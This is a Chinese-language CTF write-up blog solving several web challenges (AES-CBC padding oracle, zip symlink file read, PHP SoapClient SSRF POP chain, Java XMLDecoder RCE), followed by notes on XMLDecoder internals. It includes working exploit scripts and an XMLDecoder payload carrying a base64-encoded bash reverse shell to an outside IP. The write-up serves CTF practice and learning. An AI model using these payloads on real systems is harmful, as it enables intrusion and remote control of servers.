> 新的一天从早起刷题开始

[toc]

## 0x01 [NPUCTF2020]web🐕

```php
include('config.php');   # $key,$flag
define("METHOD", "aes-128-cbc");  //定义加密方式
define("SECRET_KEY", $key);    //定义密钥
define("IV","666666666666666")
```

一看又是密码web了，爱了爱了。

`aes-128-cbc`加密模式是cbc

![image-20220104080428723](https://img.dem0dem0.top/images/image-20220104080428723.png)

他的解密模式就是反过来，拿到第一块密文先解密然后和iv异或，再拿密文和下一个解密后的异或。现在就要去爆破了。

```python
import time
import  requests as r
IV="6666666666666666"
ciper = "ly7auKVQCZWum/W/4osuPA=="
url="http://e53b008e-6396-476d-bd0d-0ca8bce03b3e.node4.buuoj.cn:81/index.php?method=decrypt&source=1"
iv=""
N= 16
mid = ''
def xor(a,b):
    return "".join([chr(ord(a[i]) ^ ord(b[i])) for i in range(0,len(a))])


for x in range(1,N+1):
    padding = chr(x) * (x - 1)
    for y in range(0,256):
        '''
        开始爆破了
        '''
        iv = chr(0) * (N-x) + chr(y) + xor(padding,mid)
        data={
            "data": ciper,
            "iv":iv
        }
        a = r.post(url,data)
        time.sleep(0.1)
        if a.text != "False":
            mid = xor(chr(y), chr(x)) + mid
            print(mid)
            # print(a.text)
            break
plain = xor(mid,IV)
print(plain)
```

cbc翻转

```python
import base64
origin = b"piapiapiapia"
target = b'weber'
target = target.ljust(16,bytes.fromhex(str(hex(16-len(target)))[2:].rjust(2,"0")))
origin = origin.ljust(16,bytes.fromhex(str(16-len(origin)).rjust(2,"0")))
# print(origin)
iv = base64.b64decode('idNPoeLx3mRLO4qw+rLJlg==')
result = b''
for i in range(16):
    result+=bytes([target[i] ^ iv[i] ^ origin[i]])
print(base64.b64encode(result))
```

byte转字符

```python
a = bytearray([102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125])
print(a)
```

## 0x02[HCTF 2018]Hideandsee

zip软连接

uuid的获取，是和之前做过的原题，但是u1s1，哥哥们做的脚本真好用

```python
#coding=utf-8
import os
import requests
import sys

url = 'http://ab29f931-0b32-4f33-bf9c-59fb92a9a842.node4.buuoj.cn:81/upload'
def makezip():
    os.system('ln -s '+sys.argv[1]+' exp')
    os.system('zip --symlinks exp.zip exp')
makezip()

files = {'the_file':open('./exp.zip','rb')}
def exploit():
    res = requests.post(url,files=files)
    print(res.text)

exploit()
os.system('rm -rf exp')
os.system('rm -rf exp.zip')

```

然后就是mac地址转换为10进制

```python
import uuid
import random

mac = "9a:99:4b:9c:7a:0a"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*100)
print(randStr) #结果为 55.1222587560636
```

## 0x03 [MRCTF2020]Ezpop_Reveng

这个题目能扫到源码。

![image-20220104151755783](https://img.dem0dem0.top/images/image-20220104151755783.png)

![](https://img.dem0dem0.top/images/image-20220104151755783.png)

toString

![image-20220104151829871](https://img.dem0dem0.top/images/image-20220104151829871.png)

然后直接触发soap的ssrf方法到这里链子就结束了。下面就是这个题的难点了。

- soap不支持自定义headers----》 crlf
- private属性 `\0和\0\0 s和S` 需要自己对于payload进行修改。

我们都知道私有变量类名的前后都有%00，但是某些特定版本的情况下，这样也会出错

- 这个时候我们需要将s改为S，并添加`\00`

所以这里我使用了y1ng师傅的脚本

```php
<?php
//www.gem-love.com
class Typecho_Db_Query
{
    private $_adapter;
    private $_sqlPreBuild;

    public function __construct()
    {
        $target = "http://127.0.0.1/flag.php";
        $headers = array(
            'X-Forwarded-For:127.0.0.1',
            "Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rm4"
        );
        $this->_adapter = new SoapClient(null, array('uri' => 'aaab', 'location' => $target, 'user_agent' => 'Y1ng^^' . join('^^', $headers)));
        $this->_sqlPreBuild = ['action' => "SELECT"];
    }
}

class HelloWorld_DB
{
    private $coincidence;
    public function __construct()
    {
        $this->coincidence = array("hello" => new Typecho_Db_Query());
    }
}

function decorate($str)
{
    $arr = explode(':', $str);
    $newstr = '';
    for ($i = 0; $i < count($arr); $i++) {
        if (preg_match('/00/', $arr[$i])) {
            $arr[$i - 2] = preg_replace('/s/', "S", $arr[$i - 2]);
        }
    }
    $i = 0;
    for (; $i < count($arr) - 1; $i++) {
        $newstr .= $arr[$i];
        $newstr .= ":";
    }
    $newstr .= $arr[$i];
    echo "www.gem-love.com\n";
    return $newstr;
}

$y1ng = serialize(new HelloWorld_DB());
$y1ng = preg_replace(" /\^\^/", "\r\n", $y1ng);
$urlen = urlencode($y1ng);
$urlen = preg_replace('/%00/', '%5c%30%30', $urlen);
$y1ng = decorate(urldecode($urlen));
echo base64_encode($y1ng);
```

看来废物是做不出来题的，呜呜呜。卡死在门口。

## 0x04 [GKCTF 2021]babycat

> 塔门说这是一个java题，让我这个学java3天半的练习生来试一下。

![image-20220104153608818](https://img.dem0dem0.top/images/image-20220104153608818.png)

我以为开局是个sql注入，注了nm半天，发现杯骗了。

![image-20220104153740206](https://img.dem0dem0.top/images/image-20220104153740206.png)

然后发现还是guest，无聊......

![image-20220104153800250](https://img.dem0dem0.top/images/image-20220104153800250.png)

看来还是要提权了.....

![image-20220104153846042](https://img.dem0dem0.top/images/image-20220104153846042.png)

任意文件下载。环境文件

```
SHELL=/bin/sh
/home/app
/usr/local/tomcat
```

web.xml

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <servlet>
    <servlet-name>register</servlet-name>
    <servlet-class>com.web.servlet.registerServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>login</servlet-name>
    <servlet-class>com.web.servlet.loginServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>home</servlet-name>
    <servlet-class>com.web.servlet.homeServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>upload</servlet-name>
    <servlet-class>com.web.servlet.uploadServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>download</servlet-name>
    <servlet-class>com.web.servlet.downloadServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>logout</servlet-name>
    <servlet-class>com.web.servlet.logoutServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>logout</servlet-name>
    <url-pattern>/logout</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>download</servlet-name>
    <url-pattern>/home/download</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>register</servlet-name>
    <url-pattern>/register</url-pattern>
  </servlet-mapping>
  <display-name>java</display-name>
  <servlet-mapping>
    <servlet-name>login</servlet-name>
    <url-pattern>/login</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>home</servlet-name>
    <url-pattern>/home</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>upload</servlet-name>
    <url-pattern>/home/upload</url-pattern>
  </servlet-mapping>

  <filter>
    <filter-name>loginFilter</filter-name>
    <filter-class>com.web.filter.LoginFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>loginFilter</filter-name>
    <url-pattern>/home/*</url-pattern>
  </filter-mapping>
  <display-name>java</display-name>

  <welcome-file-list>
    <welcome-file>/WEB-INF/index.jsp</welcome-file>
  </welcome-file-list>
</web-app>
```

他的逻辑处理中，只会把最后一个匹配的数据去掉，也就是如果存在类似于mysql中的注释，我们把字段放在注释里面，这样就没有这样的烦恼了。

```
data={"username":"test2","password":"test","role":"admin"/*"role":"1"*/}
```

![image-20220104155733057](https://img.dem0dem0.top/images/image-20220104155733057.png)

 [JSON文件内容加注释的几种方法](https://www.cnblogs.com/zhoug2020/p/13550007.html)

JSON规范，不支持注释。之所以不允许加注释，主要是防止：过多的注释，影响了文件本身的数据载体的目的。

有些文件，尤其是配置文件，加入解释说明一些数据项的含义，是有必要的。

1、使用JSON5规范

   JSON5规范允许在JSON文件中加入注释：单行注释，多行注释均可。

说句实话还是古🐕无敌，用镜像看对于国内网站的搜录，也比某度好，pagerank真的是被他们玩明白了。现在我们可以upload了。



- 无语点1

  ```
  doPost
  ```

![image-20220104160125943](https://img.dem0dem0.top/images/image-20220104160125943.png)

真就不加权限吗?

然后我就不知道哪里有漏洞了。

```
{"jpg", "png", "gif", "bak", "properties", "xml", "html", "xhtml", "zip", "gz", "tar", "txt"}
```

可以上传的估计就是xml最容易出bug了，但是不知道怎么利用。我就去百度了一下。

发现如下两个参考连接

1. https://www.cnblogs.com/afanti/p/10222293.html

2. https://www.cnblogs.com/0x28/p/14391641.html

但是这里有点迷惑`[XmlDecoder]`在哪?

![image-20220104161224601](https://img.dem0dem0.top/images/image-20220104161224601.png)

漏网之鱼了，属于是

![image-20220104161247206](https://img.dem0dem0.top/images/image-20220104161247206.png)

```
System.getenv("CATALINA_HOME") + "/webapps/ROOT/db/db.xml"
```

现在就是复写这个文件，rce就可以了。

关于内容过滤，就是一个笑话了，xml和xss的bypass几乎可以说是一模一样了。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java>
<object class="java.lang.&#80;rocessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>{echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0Mi45My4xMDMvODAgMD4mMSc=}|{base64,-d}|{bash,-i}</string>
</void>
</array>
<void method="start"/>
</object>
</java>
```

不懂为什么不用runtime。晚上可以跟一下那个链子。

从这个题目开始学一下xml反序列化。

配置环境等操作:https://xz.aliyun.com/t/8039

> https://paper.seebug.org/916/
>
> https://zhuanlan.zhihu.com/p/108754274

这里放几张`seebug`师傅的图,感觉这个总结可以说是十分到位了.

> 如有人问标签的内部属性在哪里赋值,其实是startElement的时候了.具体的类的继承关系,建议大家去上面连接中看.

借师傅的总结贴在下面

```
XMLDecoder过程中的几个关键函数
DocumentHandler的XML解析相关函数的详细内容可以参考Java Sax的ContentHandler的文档。
ElementHandler相关函数可以参考ElementHandler的文档。
DocumentHandler创建各个标签对应的ElementHandler并进行调用。
startElement
处理开始标签，包括属性的添加 DocumentHandler:。XML解析处理过程中参数包含命名空间URL、标签名、完整标签名、属性列表。根据完整标签名创建对应的ElementHandler并添加相关属性，继续调用其startElement。
ElementHandler: 除了array标签以外，都无操作。
endElement
结束标签处理函数 DocumentHandler: 调用对应ElementHandler的endElement函数，并将当前ElementHandler回溯到上一级的ElementHandler。

ElementHandler: 没看有重写的，都是调用抽象类ElementHandler的endElement函数，判断是否需要向parent写入参数和是否需要注册标签对象ID。

characters
DocumentHandler: 标签包裹的文本内容处理函数，比如处理<string>java.lang.ProcessBuilder</string>包裹的文本内容就会从这个函数走。函数中最终调用了对应ElementHandler的addCharacter函数。

addCharacter
ElementHandler: ElementHandler里的addCharacter只接受接种空白字符(空格\n\t\r)，其余的会抛异常，而StringElementHandler中则进行了重写，会记录完整的字符串值。

addAttribute
ElementHandler: 添加属性，每种标签支持的相应的属性，出现其余属性会报错。

getContextBean
ElementHandler: 获取操作对象，比如method标签在执行方法时，要从获取上级object/void/new标签Handler所创建的对象。该方法一般会触发上一级的getValueObject方法。

getValueObject
ElementHandler: 获取当前标签所产生的对象对应的ValueObject实例。具体实现需要看每个ElementHandler类。

isArgument
ElementHandler: 判断是否为上一级标签Handler的参数。

addArgument
ElementHandler: 为当前级标签Handler添加参数。
```

![img](https://img.dem0dem0.top/images/1dd82ce2-8ebc-4528-8eaf-6da7b5b32b4c.png-w331s)

### 0x01 XMLDecoder/XMLEncoder概述

fastjson和json的关系，就是xml和XMLDecoder/XMLEncoder的关系，他们之间主要就是持久化存储。可以看到在师傅的文章中说到了，他们是对与ouputstream的一个扩充。所以使用的时候套在外面就可以了。

### 0x02 xml简介

主要就是4种标签

`String`：<string>Hello, world</string> 就表示字符串

`Object`：通过`<object>`标签表示对象，`class`属性指定具体类（用于调用其内部方法），`method`属性指定具体方法名称（比如构造函数的的方法名为`new`）

`void`:denotes a *statement* which will be executed, but whose result will not be used as an argument to the enclosing method.

他的标签是可以执行方法，但是他的返回值不会用作外层方法的参数。 如果是`property`就表示是赋值操作。

`array`表示数组，他的class表示具体的类，内部嵌套`void`的`index`可以用做索引。

### 0x03 xml反序列化源码分析

> 其实我感觉这不能算是一个漏洞，就是正常的功能被利用了。

记录一些它加载对象的过程，方便于后期对于这方面的学习。SAX解析：https://blog.csdn.net/weixin_40707866/article/details/80844865

![image-20220104195402139](https://img.dem0dem0.top/images/image-20220104195402139.png)

到这里开始才是正常的xml解析流程了，前面都是在创建一些预备的流程，比如complete参数就是为了区分是否将所有的事件都和相应的`handler`绑定上了。这是测试的xml。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java>
 <void class="java.lang.ProcessBuilder" method="new">
  <array class="java.lang.String" length="1">
   <void index="0">
    <string>calc</string>
   </void>
  </array>
  <void method="start"/>
 </void>
</java>
```

这里因为版本的原因，在我选择的`jdk1.8.0_301`已经将具体的处理逻辑放在`next()`函数中，`event`中寄存的确实下一个状态，并且还未处理，将在下一个next中处理。

```
 SCANNER_STATE_CHARACTER_DATA  state: Text declaration.
```

我们首先来说一下前面进入的流程和后面代码执行的流程，中间步骤大家感兴趣的可以自己去看看，很曲折，很有趣，我感觉不想上课（。

```java
        this.setElementHandler("java", JavaElementHandler.class);
        this.setElementHandler("null", NullElementHandler.class);
        this.setElementHandler("array", ArrayElementHandler.class);
        this.setElementHandler("class", ClassElementHandler.class);
        this.setElementHandler("string", StringElementHandler.class);
        this.setElementHandler("object", ObjectElementHandler.class);
        this.setElementHandler("void", VoidElementHandler.class);
        this.setElementHandler("char", CharElementHandler.class);
        this.setElementHandler("byte", ByteElementHandler.class);
        this.setElementHandler("short", ShortElementHandler.class);
        this.setElementHandler("int", IntElementHandler.class);
        this.setElementHandler("long", LongElementHandler.class);
        this.setElementHandler("float", FloatElementHandler.class);
        this.setElementHandler("double", DoubleElementHandler.class);
        this.setElementHandler("boolean", BooleanElementHandler.class);
        this.setElementHandler("new", NewElementHandler.class);
        this.setElementHandler("var", VarElementHandler.class);
        this.setElementHandler("true", TrueElementHandler.class);
        this.setElementHandler("false", FalseElementHandler.class);
        this.setElementHandler("field", FieldElementHandler.class);
        this.setElementHandler("method", MethodElementHandler.class);
        this.setElementHandler("property", PropertyElementHandler.class);
```

首先我们也看一下`documethandler`的处理流程

![image-20220104231954659](https://img.dem0dem0.top/images/image-20220104231954659.png)

像我们这里,就是创建了java的handler.设置了owner与parent,因为它是现在是最顶层的标签,所以这还了var5为null. 然后给javahander设置了参数,然后就是调用startElement.因为它没有实现,整个都是没有实现的.

紧跟着的就是`SCANNER_STATE_CHARACTER_DATA`读入上面的标签的`text`内容,因为他的元素内部没有属性.

现在是void标签

![image-20220104233201004](https://img.dem0dem0.top/images/image-20220104233201004.png)

同样的代码,设置了var5为java.

![image-20220104233321813](https://img.dem0dem0.top/images/image-20220104233321813.png)

这是varhandler的继承关系.所以他的start调用的是Object的方法,这也解释了为什么这两个标签可以互换.

![image-20220104233929313](https://img.dem0dem0.top/images/image-20220104233929313.png)

![image-20220104233956832](https://img.dem0dem0.top/images/image-20220104233956832.png)

到这里,给void标签赋值了`type`为class了. 到这里就返回了

扫描器的状态: `SCANNER_STATE_START_ELEMENT_TAG` = > `scanStartElement` 去生成新的handler来处理标签,并且确定整个标签是否为空,并且设置好父子关系.

一直跳过,跳到了`<void method="start"/>`调用了

```java
fContentHandler.endElement(uri, localpart,
                           element.rawname);
```

先使用了父类的endElement,然后它调用`this.handler`的end方法,但是`void`标签并没有实现这个方法.就直接又到了elementHandler发方法.然后又`getValueObject`就是层层调用了.

![image-20220104235528696](https://img.dem0dem0.top/images/image-20220104235528696.png)

![image-20220104235249629](https://img.dem0dem0.top/images/image-20220104235249629.png)



然后就到了Object的`getValueObject`方法.

然后调用

![image-20220104235721430](https://img.dem0dem0.top/images/image-20220104235721430.png)





来获取操作对象,因为java中所有方法也是绑定在对象上的. 然后一直调用顶层,终于拿到了ProcessBuilder.这是赋值到父类的`void`标签了`this.type`




![](https://img.dem0dem0.top/images/image-20220104235007368.png)

最后就是invoke调用了.

刚开始我有异或,为什么先调用了New的`getValueObject`,而不是直接调用`Object`的,(后面发现是无参数.
